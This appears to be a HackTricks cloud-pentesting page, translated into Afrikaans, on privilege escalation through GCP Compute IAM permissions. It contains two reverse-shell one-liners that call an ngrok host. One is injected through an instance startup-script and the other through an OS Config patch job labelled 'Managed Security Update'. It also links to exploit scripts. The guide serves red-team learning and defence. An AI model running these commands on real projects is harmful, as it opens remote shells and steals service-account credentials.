# GCP - Compute Privesc

{% hint style="success" %}
Leer & oefen AWS Hacking:<img src="../../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">\
Leer & oefen GCP Hacking: <img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Kyk na die [**subskripsie planne**](https://github.com/sponsors/carlospolop)!
* **Sluit aan by die** üí¨ [**Discord groep**](https://discord.gg/hRep4RUj7f) of die [**telegram groep**](https://t.me/peass) of **volg** ons op **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Deel hacking truuks deur PRs in te dien na die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Compute

Vir meer inligting oor Compute en VPC (netwerk) in GCP, kyk:

{% content-ref url="../../gcp-services/gcp-compute-instances-enum/" %}
[gcp-compute-instances-enum](../../gcp-services/gcp-compute-instances-enum/)
{% endcontent-ref %}

{% hint style="danger" %}
Let daarop dat om al die privilege escalation aanvalle uit te voer wat vereis dat die metadata van die instansie gewysig word (soos om nuwe gebruikers en SSH sleutels by te voeg), dit **nodig is dat jy `actAs` toestemmings oor die SA wat aan die instansie geheg is, het**, selfs al is die SA reeds geheg!
{% endhint %}

### `compute.projects.setCommonInstanceMetadata`

Met daardie toestemming kan jy **wysig** die **metadata** inligting van 'n **instansie** en die **geautoriseerde sleutels van 'n gebruiker** verander, of **skep** 'n **nuwe gebruiker met sudo** toestemmings. Daarom sal jy in staat wees om via SSH in enige VM instansie in te log en die GCP Service Account waarmee die Instansie loop, te steel.\
Beperkings:

* Let daarop dat GCP Service Accounts wat in VM instansies loop, standaard 'n **baie beperkte omvang** het.
* Jy sal **in staat moet wees om die SSH** bediener te kontak om in te log.

Vir meer inligting oor hoe om hierdie toestemming te benut, kyk:

{% content-ref url="gcp-add-custom-ssh-metadata.md" %}
[gcp-add-custom-ssh-metadata.md](gcp-add-custom-ssh-metadata.md)
{% endcontent-ref %}

Jy kan ook hierdie aanval uitvoer deur nuwe opstart-skrip by te voeg en die instansie te herbegin:
```bash
gcloud compute instances add-metadata my-vm-instance \
--metadata startup-script='#!/bin/bash
bash -i >& /dev/tcp/0.tcp.eu.ngrok.io/18347 0>&1 &'

gcloud compute instances reset my-vm-instance
```
### `compute.instances.setMetadata`

Hierdie toestemming gee die **dieselfde bevoegdhede as die vorige toestemming** maar oor 'n spesifieke instansie in plaas van 'n hele projek. Die **dieselfde ontploffings en beperkings as vir die vorige afdeling geld**.

### `compute.instances.setIamPolicy`

Hierdie tipe toestemming sal jou toelaat om **jouself 'n rol met die vorige toestemmings toe te ken** en bevoegdhede te verhoog deur dit te misbruik.

### **`compute.instances.osLogin`**

As **OSLogin geaktiveer is in die instansie**, kan jy met hierdie toestemming net **`gcloud compute ssh [INSTANCE]`** uitvoer en met die instansie verbind. Jy **sal nie root bevoegdhede** binne die instansie h√™ nie.

{% hint style="success" %}
Om suksesvol met hierdie toestemming binne die VM instansie aan te meld, moet jy die `iam.serviceAccounts.actAs` toestemming oor die SA wat aan die VM gekoppel is, h√™.
{% endhint %}

### **`compute.instances.osAdminLogin`**

As **OSLogin geaktiveer is in die instansie**, kan jy met hierdie toestemming net **`gcloud compute ssh [INSTANCE]`** uitvoer en met die instansie verbind. Jy sal **root bevoegdhede** binne die instansie h√™.

{% hint style="success" %}
Om suksesvol met hierdie toestemming binne die VM instansie aan te meld, moet jy die `iam.serviceAccounts.actAs` toestemming oor die SA wat aan die VM gekoppel is, h√™.
{% endhint %}

### `compute.instances.create`,`iam.serviceAccounts.actAs, compute.disks.create`, `compute.instances.create`, `compute.instances.setMetadata`, `compute.instances.setServiceAccount`, `compute.subnetworks.use`, `compute.subnetworks.useExternalIp`

Dit is moontlik om **'n virtuele masjien met 'n toegewyde Diensrekening te skep en die token** van die diensrekening te steel deur toegang tot die metadata om bevoegdhede te verhoog.

Die ontploffingskrypt vir hierdie metode kan [hier gevind word](https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation/blob/master/ExploitScripts/compute.instances.create.py).

### `osconfig.patchDeployments.create` | `osconfig.patchJobs.exec`

As jy die **`osconfig.patchDeployments.create`** of **`osconfig.patchJobs.exec`** toestemmings het, kan jy 'n [**patch werk of ontplooiing**](https://blog.raphael.karger.is/articles/2022-08/GCP-OS-Patching) skep. Dit sal jou in staat stel om lateraal in die omgewing te beweeg en kode-uitvoering op al die rekenaarinstansies binne 'n projek te verkry.

Let daarop dat jy op die oomblik **nie `actAs` toestemming** oor die SA wat aan die instansie gekoppel is, nodig het nie.

As jy dit handmatig wil ontplof, sal jy of 'n [**patch werk**](https://github.com/rek7/patchy/blob/main/pkg/engine/patches/patch_job.json) **of** [**ontplooiing**](https://github.com/rek7/patchy/blob/main/pkg/engine/patches/patch_deployment.json)** moet skep.**\
Vir 'n patch werk, voer die volgende uit:

{% code overflow="wrap" %}
```python
cat > /tmp/patch-job.sh <<EOF
#!/bin/bash
bash -i >& /dev/tcp/0.tcp.eu.ngrok.io/18442 0>&1
EOF

gsutil cp /tmp/patch-job.sh gs://readable-bucket-by-sa-in-instance/patch-job.sh

# Get the generation number
gsutil ls -a gs://readable-bucket-by-sa-in-instance

gcloud --project=$PROJECT_ID compute os-config patch-jobs execute \
--instance-filter-names=zones/us-central1-a/instances/<instance-name> \
--pre-patch-linux-executable=gs://readable-bucket-by-sa-in-instance/patch-job.sh#<generation-number> \
--reboot-config=never \
--display-name="Managed Security Update" \
--duration=300s
```
{% endcode %}

Om 'n patch-implementering te ontplooi:
```bash
gcloud compute os-config patch-deployments create <name> ...
```
Die hulpmiddel [patchy](https://github.com/rek7/patchy) kon in die verlede gebruik word om hierdie miskonfigurasie te benut (maar dit werk nou nie).

**'n Aanvaller kan dit ook misbruik vir volharding.**

### `compute.machineImages.setIamPolicy`

**Gee jouself ekstra regte** op die rekenaarbeeld.

### `compute.snapshots.setIamPolicy`

**Gee jouself ekstra regte** op 'n skyfopname.

### `compute.disks.setIamPolicy`

**Gee jouself ekstra regte** op 'n skyf.

### Bypass Access Scopes

Volg hierdie skakel om 'n paar [**idees te vind om toegangskope te omseil**](../).

### Plaaslike Privilege Escalation in GCP Compute instance

{% content-ref url="../gcp-local-privilege-escalation-ssh-pivoting.md" %}
[gcp-local-privilege-escalation-ssh-pivoting.md](../gcp-local-privilege-escalation-ssh-pivoting.md)
{% endcontent-ref %}

## Verwysings

* [https://rhinosecuritylabs.com/gcp/privilege-escalation-google-cloud-platform-part-1/](https://rhinosecuritylabs.com/gcp/privilege-escalation-google-cloud-platform-part-1/)

{% hint style="success" %}
Leer & oefen AWS Hacking:<img src="../../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">\
Leer & oefen GCP Hacking: <img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Ondersteun HackTricks</summary>

* Kyk na die [**subskripsieplanne**](https://github.com/sponsors/carlospolop)!
* **Sluit aan by die** üí¨ [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Deel hacking truuks deur PRs in te dien na die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
